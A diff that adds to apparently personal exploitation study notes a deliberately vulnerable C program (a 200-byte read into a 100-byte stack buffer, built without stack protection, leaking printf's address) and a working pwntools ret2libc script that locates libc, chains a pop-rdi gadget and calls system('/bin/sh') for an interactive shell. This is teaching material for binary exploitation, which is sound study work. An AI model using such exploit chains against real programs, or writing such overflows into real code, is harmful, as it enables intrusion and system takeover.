@@ -1599,6 +1599,13 @@ $
 
 
 
+<br>
+
+
+
+
+
+<br>
 
 
 <br>
@@ -1610,7 +1617,82 @@ $
 <br>
 
 
+# A simpler version, no canary
 
+```c
+// gcc vuln.c -o vuln -fno-stack-protector
+#include <unistd.h>
+#include <stdio.h>
+
+int main() {
+    printf("free leak: %p\n", &printf);
+    fflush(stdout);
+
+    printf("payload: ");
+    fflush(stdout);
+
+    char input[100];
+    read(0, &input, 200);
+}
+```
+
+
+<br>
+
+
+
+```python
+from pwn import *
+libc = ELF('/usr/lib/libc.so.6')
+p = process('./vuln')
+
+n = 0x70
+
+print(p.recvuntil(b'free leak: '))
+printf_leak = int(p.recvline().strip().decode(), 16)
+
+LIBC_BASE = printf_leak - libc.symbols['printf']
+LIBC_SYSTEM = LIBC_BASE + libc.symbols['system']
+LIBC_BINSH = LIBC_BASE + next(libc.search(b'/bin/sh')) # or strings -td
+
+
+###### gadgets ###########
+# 0x244cc: ret ; (1 found)
+RET = p64(LIBC_BASE + 0x244cc)
+
+# 0xc398c: pop rdi ; or al, 0x00 ; ret ; (1 found)
+POP_RDI = p64(LIBC_BASE + 0xc398c)
+###########################
+
+payload = b'A'*n + b'oldrbpxx'
+
+# system
+payload += POP_RDI + p64(LIBC_BINSH) 
+payload += RET + p64(LIBC_SYSTEM)
+
+print(p.recv())
+p.send(payload)
+p.interactive()
+```
+
+<br>
+
+
+
+<br>
+
+
+
+
+
+
+---
+
+
+<br>
+
+
+<br>
 
 
 <br>
